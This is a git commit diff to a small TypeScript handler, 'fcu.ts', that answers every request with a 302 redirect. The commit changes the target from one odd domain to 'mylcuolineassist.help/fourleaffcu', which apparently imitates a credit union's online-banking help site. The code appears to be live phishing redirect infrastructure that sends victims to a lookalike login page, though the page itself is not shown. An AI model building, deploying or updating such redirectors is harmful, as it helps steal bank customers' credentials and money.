c1f59d4eff4cad212ae2313805a1a067d5a1b643
donaldmessup-create <donaldmessup@gmail.com>
2025-08-25 08:44:08 -0700

    Update fcu.ts

--- fcu.ts
+++ fcu.ts
@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://dispuacc-rvlwnow.co/simmon",
+      Location: "https://mylcuolineassist.help/fourleaffcu",
     },
   });
 });
